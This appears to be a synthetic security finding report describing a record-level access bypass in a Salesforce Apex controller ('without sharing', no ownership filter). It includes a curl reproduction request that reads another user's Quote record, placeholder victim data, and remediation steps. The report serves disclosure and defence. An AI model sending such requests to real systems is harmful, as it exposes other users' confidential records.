# Security Analysis Report
**System:** WingTech Maintenance Portal (Salesforce-Integrated)
**Domain:** Aerospace / MRO
**Example ID:** SF-0076
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform — Pattern 9.2 | SOQL record-level access bypass on `QuoteController.getQuoteDetails` — attacker reads any MRO Quote record without Salesforce sharing enforcement |

---

## Finding 1 — Platform: SOQL and Salesforce Record-Level Access Bypass on Quote Object (Pattern 9.2)

### Summary
The Apex controller `QuoteController` on WingTech Maintenance Portal (`8af161ba.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Quote object. The SOQL query in §4.0 contains no `AND OwnerId = :UserInfo.getUserId()` predicate and no `WITH SECURITY_ENFORCED` clause, making platform sharing rules ineffective. Per §5.0 Pattern 9.2, a valid Salesforce session holder can enumerate any Quote record.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.QuoteController.getQuoteDetails`
**Affected endpoint:** `POST https://8af161ba.lightning.force.com/aura`
**Note:** Apex method name and Aura descriptor both use `getQuoteDetails` — consistent within context.txt.

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://8af161ba.lightning.force.com/aura
Authorization: Bearer 00D8AF161BA!AR8af161ba...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D8AF161BA!AR8af161ba...

message={"actions":[{"id":"1;a","descriptor":"c.QuoteController.getQuoteDetails","callingDescriptor":"UNKNOWN",
"params":{"quoteId":"00161BA","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Quote Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "00161BA", "Name": "Victim Quote Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-48-6718"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D8AF161BA!AR8af161ba..."
curl -s -X POST "https://8af161ba.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.QuoteController.getQuoteDetails","callingDescriptor":"UNKNOWN","params":{"quoteId":"00161BA","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-48-6718
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class QuoteController { ... }`
2. `WHERE Id = :quoteId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
